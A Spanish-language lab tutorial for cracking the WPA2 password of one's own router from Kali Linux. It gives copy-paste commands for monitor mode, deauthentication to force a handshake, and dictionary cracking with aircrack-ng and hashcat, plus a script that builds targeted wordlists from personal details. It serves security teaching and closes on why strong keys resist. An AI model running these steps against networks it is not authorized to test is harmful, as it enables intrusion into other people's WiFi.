# Implementar el laboratorio en tu máquina Kali — de cero al crackeo

> Recordatorio de una sola línea: **todo esto es contra TU router.** Ese es el requisito que
> convierte el ejercicio en legal. Fuera de tu lab, sin permiso escrito, es delito.

Sigue las fases en orden. Cada comando es para copiar y pegar. Al final vas a ver la clave en
pantalla, y después vas a comprobar por qué una clave fuerte **no** cae.

Los archivos del lab que ya tienes en Windows (`C:\Users\mateo\Desktop\lab-wifi\`):
- `auditar-wifi.sh` — el asistente automático.
- `generar-diccionario.sh` — construye diccionarios a medida.
- `diccionario-lab.txt` — diccionario pequeño ya hecho (incluye las claves de prueba).
- `LEEME.md` — la teoría y el método manual.
- `IMPLEMENTAR_EN_KALI.md` — este archivo.

---

## FASE A — Tener Kali corriendo

Elige UNA opción:

**A.1 · USB en vivo (lo más simple y lo que recomiendo para WiFi).**
1. Descarga la ISO "Kali Linux Live" de `kali.org/get-kali`.
2. Graba la ISO en un USB (≥8 GB) con **Rufus** (Windows) o **balenaEtcher**.
3. Reinicia el PC y arranca desde el USB (tecla de arranque: F12/F2/ESC/Supr según la marca).
4. Elige "Live system". Usuario/clave por defecto en live: `kali` / `kali`.

**A.2 · Máquina virtual (VirtualBox).**
1. Instala VirtualBox y descarga la imagen "Kali VirtualBox" pre-hecha de `kali.org`.
2. Impórtala e inícialas. Usuario/clave: `kali` / `kali`.
3. ⚠️ En VM el WiFi **interno del portátil no sirve**: necesitas sí o sí un adaptador USB (Fase B)
   y conectárselo a la VM con *Dispositivos → USB → [tu adaptador]*.

Actualiza el sistema una vez dentro:
```bash
sudo apt update && sudo apt full-upgrade -y
```

---

## FASE B — Preparar el adaptador WiFi

Necesitas un adaptador que soporte **modo monitor + inyección** (ver LEEME §2: Alfa AWUS036NHA,
TL-WN722N **v1**, etc.). Conéctalo y comprueba:

```bash
lsusb            # debe aparecer tu adaptador (Atheros / Realtek / MediaTek)
iw dev           # debe listar una interfaz: wlan0, wlan1...
```
Si no aparece en `iw dev`, no sigas: el resto no funciona sin adaptador visible. (En VM, revisa el
passthrough USB.)

Instala las herramientas (en Kali ya vienen; esto es por si acaso):
```bash
sudo apt install -y aircrack-ng iw hcxtools hashcat
```

Prueba de fuego de inyección (opcional pero recomendable):
```bash
sudo airmon-ng start wlan0
sudo aireplay-ng --test wlan0mon      # debe decir "Injection is working!"
sudo airmon-ng stop wlan0mon
```

---

## FASE C — Pasar los archivos del lab a Kali

Elige lo que te sea más cómodo:

**C.1 · Por USB (lo más directo).** Copia la carpeta `lab-wifi` a un pendrive desde Windows,
enchúfalo en Kali y cópiala al escritorio:
```bash
cp -r /media/kali/*/lab-wifi ~/lab-wifi   # la ruta del USB puede variar; usa 'lsblk' para verla
cd ~/lab-wifi
```

**C.2 · Carpeta compartida (VM VirtualBox).** Configura una carpeta compartida apuntando a
`C:\Users\mateo\Desktop\lab-wifi` y móntala; luego cópiala a `~/lab-wifi`.

**C.3 · Rehacerlos a mano.** Los archivos son texto: puedes recrearlos en Kali con `nano`.

Da permisos de ejecución cuando estén en Kali:
```bash
cd ~/lab-wifi
chmod +x auditar-wifi.sh generar-diccionario.sh
```

---

## FASE D — Configurar el router de pruebas

En el panel de tu router (normalmente `192.168.1.1`):
1. Seguridad: **WPA2-PSK (AES)**. (Deja WPA3 para después: no cae con este método, y eso es parte
   de la lección.)
2. Contraseña: pon una **de la lista de prueba** para ver el crackeo funcionar:
   `password1`, `iloveyou` o `superman` (las tres están en `diccionario-lab.txt`).
3. Deja **tu móvil conectado** a esa WiFi: lo necesitas para generar el handshake.
4. Anota el **nombre de la red (ESSID)** para reconocerla en el escaneo.

---

## FASE E — Ejecutar la auditoría

### Opción rápida (el asistente):
```bash
cd ~/lab-wifi
sudo ./auditar-wifi.sh
```
Escribe `SI` para confirmar autorización, elige el adaptador, escanea (localiza TU red, anota su
**BSSID** y **CH**, `Ctrl-C`), y cuando te pida forzar el handshake abre **otra terminal**:
```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```
(cambia el BSSID y `wlan0mon` por los tuyos). Vuelve a la primera terminal; en cuanto veas arriba a la
derecha `WPA handshake: ...`, pulsa `Ctrl-C`. El script verifica el handshake y pasa a crackear.

**Cuando te pida el diccionario, en vez del rockyou por defecto escribe la ruta del diccionario de lab:**
```
/home/kali/lab-wifi/diccionario-lab.txt
```

### Opción manual (para entender cada paso) — LEEME §4.

---

## FASE F — Ver el crackeo con el diccionario de lab

Si prefieres crackear a mano un `.cap` ya capturado:
```bash
aircrack-ng -w ~/lab-wifi/diccionario-lab.txt -b AA:BB:CC:DD:EE:FF captura-01.cap
```
Como la clave que pusiste está en el diccionario, verás:
```
KEY FOUND! [ password1 ]
```
Eso es todo el ciclo de un ataque de diccionario WPA2 completado de punta a punta.

---

## FASE G — La otra mitad del ejercicio: por qué una clave fuerte NO cae

Esto es lo que de verdad te llevas como futuro profesional de seguridad.

1. Vuelve al router y cambia la clave por una **larga y aleatoria**, por ejemplo:
   `k7$Rp2!mX9vLq4Zt` (16 caracteres, sin palabras).
2. Reconecta tu móvil y **captura otro handshake** (repite Fase E hasta tener un `.cap` nuevo).
3. Intenta crackearlo con el mismo diccionario:
   ```bash
   aircrack-ng -w ~/lab-wifi/diccionario-lab.txt -b AA:BB:CC:DD:EE:FF captura-02.cap
   ```
   Resultado: `Passphrase not in dictionary`. **No cae.**
4. Ni con rockyou entero caería, ni con GPU en tiempo humano. Conclusión: **WPA2 no se rompe; se
   rompen las claves débiles.** La defensa es una contraseña larga y aleatoria (y WPA3 si el router
   lo soporta).

### Construir tu propio diccionario dirigido
Para practicar ataques dirigidos (los que de verdad funcionan contra objetivos reales autorizados),
genera un diccionario alrededor de datos del objetivo:
```bash
./generar-diccionario.sh althura milton laura 1998 > dirigido.txt
wc -l dirigido.txt
```
Verás cómo, a partir de pocos datos personales, salen miles de candidatos realistas. Ese es el
argumento de por qué no se usan nombres, fechas ni palabras en las claves.

---

## FASE H — Dejar la máquina como estaba

Si algo quedó a medias y perdiste internet en Kali:
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```
(El asistente `auditar-wifi.sh` ya hace esto solo al salir.)

---

## Chuleta de comandos

| Objetivo | Comando |
|---|---|
| Ver adaptadores | `iw dev` · `lsusb` |
| Modo monitor | `sudo airmon-ng check kill && sudo airmon-ng start wlan0` |
| Probar inyección | `sudo aireplay-ng --test wlan0mon` |
| Escanear | `sudo airodump-ng wlan0mon` |
| Capturar handshake | `sudo airodump-ng --bssid <BSSID> -c <CH> -w captura wlan0mon` |
| Forzar handshake | `sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon` |
| Verificar captura | `aircrack-ng captura-01.cap` |
| Crackear (lab) | `aircrack-ng -w ~/lab-wifi/diccionario-lab.txt -b <BSSID> captura-01.cap` |
| Generar diccionario | `./generar-diccionario.sh palabra1 palabra2 > salida.txt` |
| Crackear con GPU | `hcxpcapngtool -o h.hc22000 captura-01.cap && hashcat -m 22000 h.hc22000 lista.txt` |
| Restaurar red | `sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager` |
